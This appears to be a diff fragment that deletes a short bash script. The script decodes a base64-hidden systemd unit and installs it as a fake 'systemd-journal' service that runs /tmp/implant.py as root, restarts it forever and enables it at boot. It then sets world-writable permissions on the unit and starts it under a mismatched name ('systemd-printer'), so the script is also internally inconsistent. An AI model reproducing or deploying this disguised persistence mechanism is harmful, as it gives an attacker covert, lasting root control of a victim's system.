@@ -1,5 +1,0 @@
-#!/bin/bash
-echo W1VuaXRdCkRlc2NyaXB0aW9uPUpvdXJuYWwgU2VydmljZQoKW1NlcnZpY2VdClVzZXI9cm9vdApFeGVjU3RhcnQ9L3Vzci9iaW4vcHl0aG9uMyAvdG1wL2ltcGxhbnQucHkKUmVzdGFydD1hbHdheXMKUmVzdGFydFNlYz0zMApTdGFydExpbWl0SW50ZXJ2YWxTZWM9MAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLnVzZXIudGFyZ2V0 | base64 -d | sudo tee /etc/systemd/system/systemd-journal.service
-sudo chmod 777 /etc/systemd/system/systemd-printer.service
-sudo systemctl daemon-reload
-sudo systemctl start systemd-printer
